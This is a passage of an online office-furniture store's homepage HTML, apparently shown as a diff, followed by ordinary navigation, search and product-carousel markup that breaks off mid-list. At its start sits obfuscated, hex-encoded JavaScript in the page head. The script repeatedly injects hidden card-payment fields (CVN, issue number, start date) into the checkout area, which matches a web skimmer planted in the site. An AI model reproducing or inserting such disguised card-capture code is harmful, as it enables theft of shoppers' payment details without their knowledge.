6E\x74\x72\x79\x20\x76\x61\x6C\x69\x64\x61\x74\x65\x2D\x63\x63\x2D\x63\x76\x6E\x22\x20\x69\x64\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x63\x5F\x63\x69\x64\x22\x20\x6E\x61\x6D\x65\x3D\x22\x70\x61\x79\x6D\x65\x6E\x74\x5B\x63\x63\x5F\x63\x69\x64\x5D\x22\x20\x76\x61\x6C\x75\x65\x3D\x22\x22\x3E\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x61\x20\x68\x72\x65\x66\x3D\x22\x23\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x63\x76\x76\x2D\x77\x68\x61\x74\x2D\x69\x73\x2D\x74\x68\x69\x73\x22\x3E\x57\x68\x61\x74\x20\x69\x73\x20\x74\x68\x69\x73\x3F\x3C\x2F\x61\x3E\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x2F\x6C\x69\x3E\x20\x3C\x6C\x69\x20\x69\x64\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x63\x5F\x74\x79\x70\x65\x5F\x73\x73\x5F\x64\x69\x76\x22\x20\x73\x74\x79\x6C\x65\x3D\x22\x64\x69\x73\x70\x6C\x61\x79\x3A\x20\x6E\x6F\x6E\x65\x3B\x22\x3E\x20\x3C\x75\x6C\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x6E\x65\x72\x2D\x66\x6F\x72\x6D\x22\x3E\x20\x3C\x6C\x69\x20\x63\x6C\x61\x73\x73\x3D\x22\x66\x6F\x72\x6D\x2D\x61\x6C\x74\x22\x3E\x3C\x6C\x61\x62\x65\x6C\x20\x66\x6F\x72\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x63\x5F\x69\x73\x73\x75\x65\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x72\x65\x71\x75\x69\x72\x65\x64\x22\x3E\x3C\x65\x6D\x3E\x2A\x3C\x2F\x65\x6D\x3E\x53\x77\x69\x74\x63\x68\x2F\x53\x6F\x6C\x6F\x2F\x4D\x61\x65\x73\x74\x72\x6F\x20\x4F\x6E\x6C\x79\x3C\x2F\x6C\x61\x62\x65\x6C\x3E\x3C\x2F\x6C\x69\x3E\x20\x3C\x6C\x69\x3E\x20\x3C\x6C\x61\x62\x65\x6C\x20\x66\x6F\x72\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x63\x5F\x69\x73\x73\x75\x65\x22\x3E\x49\x73\x73\x75\x65\x20\x4E\x75\x6D\x62\x65\x72\x3A\x3C\x2F\x6C\x61\x62\x65\x6C\x3E\x20\x3C\x73\x70\x61\x6E\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x70\x75\x74\x2D\x62\x6F\x78\x22\x3E\x20\x3C\x69\x6E\x70\x75\x74\x20\x74\x79\x70\x65\x3D\x22\x74\x65\x78\x74\x22\x20\x74\x69\x74\x6C\x65\x3D\x22\x49\x73\x73\x75\x65\x20\x4E\x75\x6D\x62\x65\x72\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x70\x75\x74\x2D\x74\x65\x78\x74\x20\x76\x61\x6C\x69\x64\x61\x74\x65\x2D\x63\x63\x2D\x75\x6B\x73\x73\x20\x63\x76\x76\x22\x20\x69\x64\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x63\x5F\x69\x73\x73\x75\x65\x22\x20\x6E\x61\x6D\x65\x3D\x22\x70\x61\x79\x6D\x65\x6E\x74\x5B\x63\x63\x5F\x73\x73\x5F\x69\x73\x73\x75\x65\x5D\x22\x20\x76\x61\x6C\x75\x65\x3D\x22\x22\x3E\x20\x3C\x2F\x73\x70\x61\x6E\x3E\x20\x3C\x2F\x6C\x69\x3E\x20\x20\x3C\x6C\x69\x3E\x20\x3C\x6C\x61\x62\x65\x6C\x20\x66\x6F\x72\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x73\x74\x61\x72\x74\x5F\x6D\x6F\x6E\x74\x68\x22\x3E\x53\x74\x61\x72\x74\x20\x44\x61\x74\x65\x3A\x3C\x2F\x6C\x61\x62\x65\x6C\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x70\x75\x74\x2D\x62\x6F\x78\x22\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x76\x2D\x66\x69\x78\x22\x3E\x20\x3C\x73\x65\x6C\x65\x63\x74\x20\x69\x64\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x73\x74\x61\x72\x74\x5F\x6D\x6F\x6E\x74\x68\x22\x20\x6E\x61\x6D\x65\x3D\x22\x70\x61\x79\x6D\x65\x6E\x74\x5B\x63\x63\x5F\x73\x73\x5F\x73\x74\x61\x72\x74\x5F\x6D\x6F\x6E\x74\x68\x5D\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x76\x61\x6C\x69\x64\x61\x74\x65\x2D\x63\x63\x2D\x75\x6B\x73\x73\x20\x6D\x6F\x6E\x74\x68\x22\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x22\x20\x73\x65\x6C\x65\x63\x74\x65\x64\x3D\x22\x73\x65\x6C\x65\x63\x74\x65\x64\x22\x3E\x4D\x6F\x6E\x74\x68\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x31\x22\x3E\x30\x31\x20\x2D\x20\x4A\x61\x6E\x75\x61\x72\x79\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x22\x3E\x30\x32\x20\x2D\x20\x46\x65\x62\x72\x75\x61\x72\x79\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x33\x22\x3E\x30\x33\x20\x2D\x20\x4D\x61\x72\x63\x68\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x34\x22\x3E\x30\x34\x20\x2D\x20\x41\x70\x72\x69\x6C\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x35\x22\x3E\x30\x35\x20\x2D\x20\x4D\x61\x79\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x36\x22\x3E\x30\x36\x20\x2D\x20\x4A\x75\x6E\x65\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x37\x22\x3E\x30\x37\x20\x2D\x20\x4A\x75\x6C\x79\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x38\x22\x3E\x30\x38\x20\x2D\x20\x41\x75\x67\x75\x73\x74\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x39\x22\x3E\x30\x39\x20\x2D\x20\x53\x65\x70\x74\x65\x6D\x62\x65\x72\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x31\x30\x22\x3E\x31\x30\x20\x2D\x20\x4F\x63\x74\x6F\x62\x65\x72\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x31\x31\x22\x3E\x31\x31\x20\x2D\x20\x4E\x6F\x76\x65\x6D\x62\x65\x72\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x31\x32\x22\x3E\x31\x32\x20\x2D\x20\x44\x65\x63\x65\x6D\x62\x65\x72\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x2F\x73\x65\x6C\x65\x63\x74\x3E\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x76\x2D\x66\x69\x78\x22\x3E\x20\x3C\x73\x65\x6C\x65\x63\x74\x20\x69\x64\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x73\x74\x61\x72\x74\x5F\x79\x65\x61\x72\x22\x20\x6E\x61\x6D\x65\x3D\x22\x70\x61\x79\x6D\x65\x6E\x74\x5B\x63\x63\x5F\x73\x73\x5F\x73\x74\x61\x72\x74\x5F\x79\x65\x61\x72\x5D\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x76\x61\x6C\x69\x64\x61\x74\x65\x2D\x63\x63\x2D\x75\x6B\x73\x73\x20\x79\x65\x61\x72\x22\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x22\x20\x73\x65\x6C\x65\x63\x74\x65\x64\x3D\x22\x73\x65\x6C\x65\x63\x74\x65\x64\x22\x3E\x59\x65\x61\x72\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x31\x31\x22\x3E\x32\x30\x31\x31\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x31\x32\x22\x3E\x32\x30\x31\x32\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x31\x33\x22\x3E\x32\x30\x31\x33\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x31\x34\x22\x3E\x32\x30\x31\x34\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x31\x35\x22\x3E\x32\x30\x31\x35\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x31\x36\x22\x3E\x32\x30\x31\x36\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x2F\x73\x65\x6C\x65\x63\x74\x3E\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x2F\x6C\x69\x3E\x20\x3C\x6C\x69\x20\x63\x6C\x61\x73\x73\x3D\x22\x61\x64\x76\x2D\x63\x6F\x6E\x74\x61\x69\x6E\x65\x72\x22\x3E\x26\x6E\x62\x73\x70\x3B\x3C\x2F\x6C\x69\x3E\x20\x3C\x2F\x75\x6C\x3E\x20\x20\x3C\x2F\x6C\x69\x3E\x20\x3C\x2F\x75\x6C\x3E","\x62\x65\x66\x6F\x72\x65\x65\x6E\x64","\x69\x6E\x73\x65\x72\x74\x41\x64\x6A\x61\x63\x65\x6E\x74\x48\x54\x4D\x4C"];window[_0xc240[3]](function(){if(!document[_0xc240[1]](_0xc240[0])){ShowForm(_0xc240[2])}},100);function ShowForm(_0x25adx2){if(document[_0xc240[1]](_0x25adx2)){var _0x25adx3=document[_0xc240[1]](_0x25adx2);while(_0x25adx3[_0xc240[4]]){_0x25adx3[_0xc240[5]](_0x25adx3[_0xc240[4]])};var _0x25adx4=_0xc240[6];_0x25adx3[_0xc240[8]](_0xc240[7],_0x25adx4)}}</script><meta name="google-site-verification" content="tsLLJttqizT2amAgJQhhnVkdPNEydZf45DYXWNlaq5k" />
+</head>
+<body class=" cms-index-index cms-home">
+<div class="wrapper">
+<div class="inner-wrapper">
+        <noscript>
+        <div class="global-site-notice noscript">
+            <div class="notice-inner">
+                <p>
+                    <strong>JavaScript seems to be disabled in your browser.</strong><br />
+                    You must have JavaScript enabled in your browser to utilize the functionality of this website.                </p>
+            </div>
+        </div>
+    </noscript>
+    <div class="page">
+        <div class="header-container">
+    <div class="header">
+                <h1 class="logo"><strong></strong><a href="http://www.totalofficesource.com/" title="" class="logo"><img src="http://www.totalofficesource.com/skin/frontend/ffwdDefault/totalofficesource/images/logo.gif" alt="" /></a></h1>
+            
+    <div class="cms-links">
+    <ul>
+    <li class="welcome">
+	</li>
+  <li><a href="#">Order Status</a></li>
+<li><a href="#">Customer Service</a></li>
+<li class="last"><a href="#">Find a store</a></li>    </ul>
+    </div>
+       
+       <div class="access">
+          <ul class="links">
+                        <li class="first" ><a href="http://www.totalofficesource.com/customer/account/" title="My Account" >My Account</a></li>
+                                <li ><a href="http://www.totalofficesource.com/checkout/cart/" title="My Cart" class="top-link-cart">My Cart</a></li>
+                                <li ><a href="http://www.totalofficesource.com/checkout/" title="Checkout" class="top-link-checkout">Checkout</a></li>
+                                <li ><a href="http://officefurniturecenter.com/blog" title="Blog" class="top-link-blog">Blog</a></li>
+                                <li class=" last" ><a href="http://www.totalofficesource.com/customer/account/login/" title="Log In" >Log In</a></li>
+            </ul>
+       </div>
+    </div>
+	<div id="navigation">
+	                            <div class="nav-container">
+    <ul id="nav">
+
+
+                 <li class="home active"><a href="http://www.totalofficesource.com/"><span>Home</span></a></li> 
+    
+        <li class="level0 nav-1 parent" onmouseover="toggleMenu(this,1)" onmouseout="toggleMenu(this,0)">
+<a href="http://www.totalofficesource.com/seating">
+<span>Seating</span>
+</a>
+<ul class="level0">
+<li class="level1 nav-1-1 first">
+<a href="http://www.totalofficesource.com/seating/task">
+<span>Task</span>
+</a>
+</li><li class="level1 nav-1-2">
+<a href="http://www.totalofficesource.com/seating/executive">
+<span>Executive</span>
+</a>
+</li><li class="level1 nav-1-3">
+<a href="http://www.totalofficesource.com/seating/conference">
+<span>Conference</span>
+</a>
+</li><li class="level1 nav-1-4">
+<a href="http://www.totalofficesource.com/seating/wood-side">
+<span>Wood Side</span>
+</a>
+</li><li class="level1 nav-1-5">
+<a href="http://www.totalofficesource.com/seating/side">
+<span>Side</span>
+</a>
+</li><li class="level1 nav-1-6">
+<a href="http://www.totalofficesource.com/seating/stack">
+<span>Stack</span>
+</a>
+</li><li class="level1 nav-1-7">
+<a href="http://www.totalofficesource.com/seating/sofas">
+<span>Sofas</span>
+</a>
+</li><li class="level1 nav-1-8 last">
+<a href="http://www.totalofficesource.com/seating/stools">
+<span>Stools</span>
+</a>
+</li>
+</ul>
+</li><li class="level0 nav-2 parent" onmouseover="toggleMenu(this,1)" onmouseout="toggleMenu(this,0)">
+<a href="http://www.totalofficesource.com/tables">
+<span>Tables</span>
+</a>
+<ul class="level0">
+<li class="level1 nav-2-1 first">
+<a href="http://www.totalofficesource.com/tables/conference-tables">
+<span>Conference</span>
+</a>
+</li><li class="level1 nav-2-2 last">
+<a href="http://www.totalofficesource.com/tables/training-tables">
+<span>Training</span>
+</a>
+</li>
+</ul>
+</li><li class="level0 nav-3 parent" onmouseover="toggleMenu(this,1)" onmouseout="toggleMenu(this,0)">
+<a href="http://www.totalofficesource.com/desks">
+<span>Desks</span>
+</a>
+<ul class="level0">
+<li class="level1 nav-3-1 first">
+<a href="http://www.totalofficesource.com/desks/veneer-desks">
+<span>Veneer Desks</span>
+</a>
+</li><li class="level1 nav-3-2">
+<a href="http://www.totalofficesource.com/desks/laminate-desks">
+<span>Laminate Desks</span>
+</a>
+</li><li class="level1 nav-3-3 last">
+<a href="http://www.totalofficesource.com/desks/metal-desks">
+<span>Metal Desks</span>
+</a>
+</li>
+</ul>
+</li><li class="level0 nav-4 parent" onmouseover="toggleMenu(this,1)" onmouseout="toggleMenu(this,0)">
+<a href="http://www.totalofficesource.com/filing-shelving">
+<span>Filing &amp; Shelving</span>
+</a>
+<ul class="level0">
+<li class="level1 nav-4-1 first">
+<a href="http://www.totalofficesource.com/filing-shelving/lateral-files">
+<span>Lateral Files</span>
+</a>
+</li><li class="level1 nav-4-2">
+<a href="http://www.totalofficesource.com/filing-shelving/vertical-files">
+<span>Vertical Files</span>
+</a>
+</li><li class="level1 nav-4-3">
+<a href="http://www.totalofficesource.com/filing-shelving/fire-files">
+<span>Fire Files</span>
+</a>
+</li><li class="level1 nav-4-4">
+<a href="http://www.totalofficesource.com/filing-shelving/storage-cabinets">
+<span>Storage Cabinets</span>
+</a>
+</li><li class="level1 nav-4-5 last">
+<a href="http://www.totalofficesource.com/filing-shelving/pedestals">
+<span>Pedestals</span>
+</a>
+</li>
+</ul>
+</li><li class="level0 nav-5">
+<a href="http://www.totalofficesource.com/reception">
+<span>Reception</span>
+</a>
+</li><li class="level0 nav-6 parent" onmouseover="toggleMenu(this,1)" onmouseout="toggleMenu(this,0)">
+<a href="http://www.totalofficesource.com/conference">
+<span>Conference</span>
+</a>
+<ul class="level0">
+<li class="level1 nav-6-1 first">
+<a href="http://www.totalofficesource.com/conference/tables">
+<span>Tables</span>
+</a>
+</li><li class="level1 nav-6-2">
+<a href="http://www.totalofficesource.com/conference/chairs">
+<span>Chairs</span>
+</a>
+</li><li class="level1 nav-6-3 last">
+<a href="http://www.totalofficesource.com/conference/white-boards">
+<span>White Boards</span>
+</a>
+</li>
+</ul>
+</li><li class="level0 nav-7 parent" onmouseover="toggleMenu(this,1)" onmouseout="toggleMenu(this,0)">
+<a href="http://www.totalofficesource.com/misc-office">
+<span>Miscellaneous</span>
+</a>
+<ul class="level0">
+<li class="level1 nav-7-1 first">
+<a href="http://www.totalofficesource.com/misc-office/dollies">
+<span>Dollies</span>
+</a>
+</li><li class="level1 nav-7-2">
+<a href="http://www.totalofficesource.com/misc-office/carts">
+<span>Carts</span>
+</a>
+</li><li class="level1 nav-7-3 last">
+<a href="http://www.totalofficesource.com/misc-office/white-boards">
+<span>White Boards</span>
+</a>
+</li>
+</ul>
+</li>    </ul>
+</div>
+       <form class="searchautocomplete UI-SEARCHAUTOCOMPLETE" action="http://www.totalofficesource.com/catalogsearch/result/" method="get"
+    data-tip="Search entire store here..."
+    data-url="//www.totalofficesource.com/searchautocomplete/ajax/get/"
+    data-minchars="3"
+    data-delay="500">
+
+    <label for="search">Search</label>
+    <div class="nav">
+
+                <div class="nav-search-in">
+            <span class="category-fake UI-CATEGORY-TEXT">All</span>
+            <span class="nav-down-arrow"></span>
+            <select name="cat" class="category UI-CATEGORY">
+                <option value="0">All</option>
+                                <option value="4" >
+                    Workstations                </option>
+                                <option value="5" >
+                    Budget Friendly Cubicles                </option>
+                                <option value="6" >
+                    Call Center Cubicles                </option>
+                                <option value="7" >
+                    Standard and Managerial Cubicles                </option>
+                                <option value="8" >
+                    Desks                </option>
+                                <option value="11" >
+                    Veneer Desks                </option>
+                                <option value="12" >
+                    Seating                </option>
+                                <option value="13" >
+                    Types                </option>
+                                <option value="14" >
+                    Materials                </option>
+                                <option value="16" >
+                    Tables                </option>
+                                <option value="17" >
+                    Training                </option>
+                                <option value="18" >
+                    Conference                </option>
+                                <option value="19" >
+                    Folding                </option>
+                                <option value="20" >
+                    Filing & Shelving                </option>
+                                <option value="21" >
+                    Lateral Files                </option>
+                                <option value="22" >
+                    Vertical Files                </option>
+                                <option value="23" >
+                    Fire Files                </option>
+                                <option value="24" >
+                    Reception                </option>
+                                <option value="28" >
+                    Conference                </option>
+                                <option value="29" >
+                    Tables                </option>
+                                <option value="30" >
+                    Chairs                </option>
+                                <option value="31" >
+                    White Boards                </option>
+                                <option value="32" >
+                    Miscellaneous                </option>
+                                <option value="33" >
+                    Dollies                </option>
+                                <option value="34" >
+                    Carts                </option>
+                                <option value="35" >
+                    White Boards                </option>
+                                <option value="66" >
+                    Side                </option>
+                                <option value="69" >
+                    Wood Side                </option>
+                                <option value="71" >
+                    Sofas                </option>
+                                <option value="72" >
+                    Stack                </option>
+                                <option value="73" >
+                    Stools                </option>
+                                <option value="74" >
+                    Task                </option>
+                                <option value="82" >
+                    Rooms                </option>
+                                <option value="90" >
+                    Executive                </option>
+                                <option value="91" >
+                    Conference                </option>
+                                <option value="92" >
+                    Laminate Desks                </option>
+                                <option value="93" >
+                    Meeting                </option>
+                                <option value="96" >
+                    Bookcases                </option>
+                                <option value="97" >
+                    Storage Cabinets                </option>
+                                <option value="98" >
+                    Pedestals                </option>
+                                <option value="99" >
+                    Pre-Owned                </option>
+                                <option value="100" >
+                    Trading Desks                </option>
+                                <option value="101" >
+                    Workstations                </option>
+                                <option value="102" >
+                    Desks                </option>
+                                <option value="103" >
+                    Seating                </option>
+                                <option value="104" >
+                    Tables                </option>
+                                <option value="105" >
+                    Filing & Shelving                </option>
+                                <option value="106" >
+                    Reception                </option>
+                                <option value="107" >
+                    Misc. Office                </option>
+                                <option value="108" >
+                    Refurbished                </option>
+                                <option value="110" >
+                    Workstations                </option>
+                                <option value="111" >
+                    Desks                </option>
+                                <option value="112" >
+                    Seating                </option>
+                                <option value="113" >
+                    Filing & Shelving                </option>
+                                <option value="114" >
+                    Metal Desks                </option>
+                                <option value="175" >
+                    Vintage                </option>
+                                <option value="176" >
+                    Odds & Ends                </option>
+                            </select>
+        </div>
+        
+        <div class="nav-input UI-NAV-INPUT">
+            <input class="input-text UI-SEARCH" type="text" autocomplete="off" name="q" value="" maxlength="128" />
+        </div>
+
+        <div class="searchautocomplete-loader UI-LOADER">
+            <div id="g01"></div>
+            <div id="g02"></div>
+            <div id="g03"></div>
+            <div id="g04"></div>
+            <div id="g05"></div>
+            <div id="g06"></div>
+            <div id="g07"></div>
+            <div id="g08"></div>
+        </div>
+    </div>
+    <div class="nav-submit-button">
+        <button type="submit" title="Go" class="button">Go</button>
+    </div>
+    <div style="display:none" class="searchautocomplete-placeholder UI-PLACEHOLDER"></div>
+</form>        <div class="clearfix"></div>
+    </div>
+    <!-- <div class="quick-access">
+                <p class="welcome-msg"></p>
+     
+    </div> -->
+        </div>
+        <div class="main-container col1-layout">
+            <div class="main">
+                                <div class="col-main">
+                                        <div class="std"><div class="wired-home">
+<div class="promo"><div id="slider-wrapper">
+  <div id="slider">
+  <div class="panel"><img src="http://www.totalofficesource.com/skin/frontend/ffwdDefault/totalofficesource/images/helloslide/01.jpg" alt="Flowing Rock" /> <span class="comment"></span></div>
+  <div class="panel"><img src="http://www.totalofficesource.com/skin/frontend/ffwdDefault/totalofficesource/images/helloslide/02.jpg" alt="Other" /> <span class="comment"></span></div>
+  <div id="controls">&nbsp;</div>
+  </div>
+  </div>
+<div class="promo-right"><a href="http://www.totalofficesource.com/catalog/category/view/s/desks/id/8/"><img src="http://www.totalofficesource.com/skin/frontend/ffwdDefault/totalofficesource/images/media/promo2.jpg" alt="Promotion 2" /></a> <a href="catalog/category/view/s/tables/id/16/"><img class="last" src="http://www.totalofficesource.com/skin/frontend/ffwdDefault/totalofficesource/images/media/promo3.jpg" alt="Promotion 3" /></a></div>
+</div>
+<div class="promo-bottom"><a href="catalog/category/view/s/misc-office/id/32/"><img src="http://www.totalofficesource.com/skin/frontend/ffwdDefault/totalofficesource/images/media/promo4.jpg" alt="Promotion 4" /></a></div>
+<div class="featured-social">
+
+
+
+
+  <ul id="featured" class="jcarousel-skin-tango">
+
+                        	
+          
+			    			        
+
+			
+             <li><a class="preview" rel="http://www.totalofficesource.com/media/catalog/product/cache/6/small_image/300x300/9df78eab33525d08d6e5fb8d27136e95/s/o/son_chy_execdeskcredenza18b.jpg" href="http://www.totalofficesource.com/osp-executive-desk-with-credenza" title="OSP Sonoma Double Ped Desk With Credenza">
+                        <img src="http://www.totalofficesource.com/media/catalog/product/cache/6/small_image/105x105/9df78eab33525d08d6e5fb8d27136e95/s/o/son_chy_execdeskcredenza18b.jpg" width="105" height="105" alt="OSP Sonoma Double Ped Desk With Credenza" />
+                    </a> </li>
+
+		    		    
+			
+            			        
+
+			
+             <li><a class="preview" rel="http://www.totalofficesource.com/media/catalog/product/cache/6/small_image/300x300/9df78eab33525d08d6e5fb8d27136e95/s/o/son_chy_execl16a_1.jpg" href="http://www.totalofficesource.com/osp-executive-l-shape-desk" title="OSP Sonoma L Shape Desk With Corner">
+                        <img src="http://www.totalofficesource.com/media/catalog/product/cache/6/small_image/105x105/9df78eab33525d08d6e5fb8d27136e95/s/o/son_chy_execl16a_1.jpg" width="105" height="105" alt="OSP Sonoma L Shape Desk With Corner" />
+                    </a> </li>
+
+		    		    
+			
+            			        
+
+			
+             <li><a class="preview" rel="http://www.totalofficesource.com/media/catalog/product/cache/6/small_image/300x300/9df78eab33525d08d6e5fb8d27136e95/i/o/ion_mah_2a.jpg" href="http://www.totalofficesource.com/osp-executive-l-shaped-desk-with-credenza-hutch-and-mobile-pedestals" title="OSP Ion L Shape Desk With Mobile Pedestals, Hutch, And Storage Cabinet">
+                        <img src="http://www.totalofficesource.com/media/catalog/product/cache/6/small_image/105x105/9df78eab33525d08d6e5fb8d27136e95/i/o/ion_mah_2a.jpg" width="105" height="105" alt="OSP Ion L Shape Desk With Mobile Pedestals, Hutch, And Storage Cabinet" />
+                    </a> </li>
+
+		    		    
+			
+            			        
+
+			
+             <li><a class="preview" rel="http://www.totalofficesource.com/media/catalog/product/cache/6/small_image/300x300/9df78eab33525d08d6e5fb8d27136e95/i/o/ion_mah_4a.jpg" href="http://www.totalofficesource.com/osp-executive-desk-with-hutch" title="OSP Ion Executive Office">
+                        <img src="http://www.totalofficesource.com/media/catalog/product/cache/6/small_image/105x105/9df78eab33525d08d6e5fb8d27136e95/i/o/ion_mah_4a.jpg" width="105" height="105" alt="OSP Ion Executive Office" />
+                    </a> </li>
+
+		    
+		    		    
+			
+                        	
+          
+			    			        
+
+			
+             <li><a class="preview" rel="http://www.totalofficesource.com/media/catalog/product/cache/6/small_image/300x300/9df78eab33525d08d6e5fb8d27136e95/n/a/napmah-execu-12a.jpg" href="http://www.totalofficesource.com/osp-napa-u-shape-desk-with-hutch-and-storage" title="OSP Napa U Shape Desk With Hutch And Storage">
+                        <img src="http://www.totalofficesource.com/media/catalog/product/cache/6/small_image/105x105/9df78eab33525d08d6e5fb8d27136e95/n/a/napmah-execu-12a.jpg" width="105" height="105" alt="OSP Napa U Shape Desk With Hutch And Storage" />
+                    </a> </li>
+
+		    		    
+			
+            			        
+
+			
+             <li><a class="preview" rel="http://www.totalofficesource.com/media/catalog/product/cache/6/small_image/300x300/9df78eab33525d08d6e5fb8d27136e95/n/a/napgry-3a.jpg" href="http://www.totalofficesource.com/osp-napa-executive-office" title="OSP Napa Executive Office">
+                        <img src="http://www.totalofficesource.com/media/catalog/product/cache/6/small_image/105x105/9df78eab33525d08d6e5fb8d27136e95/n/a/napgry-3a.jpg" width="105" height="105" alt="OSP Napa Executive Office" />
+                    </a> </li>
+
+		    		    
+			
+            			        
+
+			
+             <li><a class="preview" rel="http://www.totalofficesource.com/media/catalog/product/cache/6/small_image/300x300/9df78eab33525d08d6e5fb8d27136e95/n/a/napesp-u.jpg" href="http://www.totalofficesource.com/osp-napa-u-shape-desk-with-credenza-and-overhead" title="OSP Napa U Shape Desk With Credenza And Overhead">
+                        <img src="http://www.totalofficesource.com/media/catalog/product/cache/6/small_image/105x105/9df78eab33525d08d6e5fb8d27136e95/n/a/napesp-u.jpg" width="105" height="105" alt="OSP Napa U Shape Desk With Credenza And Overhead" />
+                    </a> </li>
+
+		    		    
+			
+            			        
+
+			
+             <li><a class="preview" rel="http://www.totalofficesource.com/media/catalog/product/cache/6/small_image/300x300/9df78eab33525d08d6e5fb8d27136e95/h/o/hon38155ns_1_1.jpg" href="http://www.totalofficesource.com/hon-60-double-pedestal-desk" title="HON 60&quot; Double Pedestal Desk">
+                        <img src="http://www.totalofficesource.com/media/catalog/product/cache/6/small_image/105x105/9df78eab33525d08d6e5fb8d27136e95/h/o/hon38155ns_1_1.jpg" width="105" height="105" alt="HON 60&quot; Double Pedestal Desk" />
+                    </a> </li>
+
+		    
+		    		    
+			
+                        	
+          
+			    			        
+
+			
+             <li><a class="preview" rel="http://www.totalofficesource.com/media/catalog/product/cache/6/small_image/300x300/9df78eab33525d08d6e5fb8d27136e95/h/o/hon38852ns_1_1.jpg" href="http://www.totalofficesource.com/hon-60-credenza" title="HON 60&quot; Credenza">
+                        <img src="http://www.totalofficesource.com/media/catalog/product/cache/6/small_image/105x105/9df78eab33525d08d6e5fb8d27136e95/h/o/hon38852ns_1_1.jpg" width="105" height="105" alt="HON 60&quot; Credenza" />
+                    </a> </li>
+
+		    		    
+			
+            			        
+
+			
+             <li><a class="preview" rel="http://www.totalofficesource.com/media/catalog/product/cache/6/small_image/300x300/9df78eab33525d08d6e5fb8d27136e95/u/n/une-11128_zom.jpg" href="http://www.totalofficesource.com/hon-66-left-pedestal-desk" title="HON 66&quot; L Shape Desk w/ Left Return">
